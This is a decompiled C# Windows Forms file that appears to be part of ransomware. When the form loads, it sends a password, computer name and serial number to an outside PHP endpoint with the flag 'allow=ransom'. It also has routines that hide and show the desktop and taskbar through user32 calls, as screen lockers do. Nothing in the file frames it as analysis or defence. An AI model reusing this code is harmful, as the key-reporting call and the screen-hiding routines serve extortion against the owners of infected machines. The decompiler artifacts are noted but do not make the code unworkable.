using System;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace examplesforcode;

public class Form1 : Form
{
	private const int SW_HIDE = 0;

	private const int SW_SHOW = 1;

	private string targetURL = "http://zerolifer.byethost22.com/rnsm/write.php";

	private string computername = "pcname";

	private string serial = "pcname-1234-asdfg";

	private IContainer components = null;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		ShowTask();
		int hwnd = FindWindow("Shell_TrayWnd", "");
		ShowWindow(hwnd, 1);
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public void ShowTask()
	{
		IntPtr hWnd = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);
		ShowWindow(hWnd, 5);
	}

	public void HideTask()
	{
		IntPtr hWnd = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);
		ShowWindow(hWnd, 0);
	}

	[DllImport("user32.dll")]
	private static extern int FindWindow(string className, string windowText);

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int hwnd, int command);

	private void Form1_Load(object sender, EventArgs e)
	{
		string password = "sifre";
		SendPassword(password);
	}

	public void SendPassword(string password)
	{
		string text = "?computer_name=" + computername + "&serialnumber=" + serial + "&password=" + password + "&allow=ransom";
		string address = targetURL + text;
		string text2 = new WebClient().DownloadString(address);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(267, 108));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(157, 80));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Show Desktop");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(682, 285));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
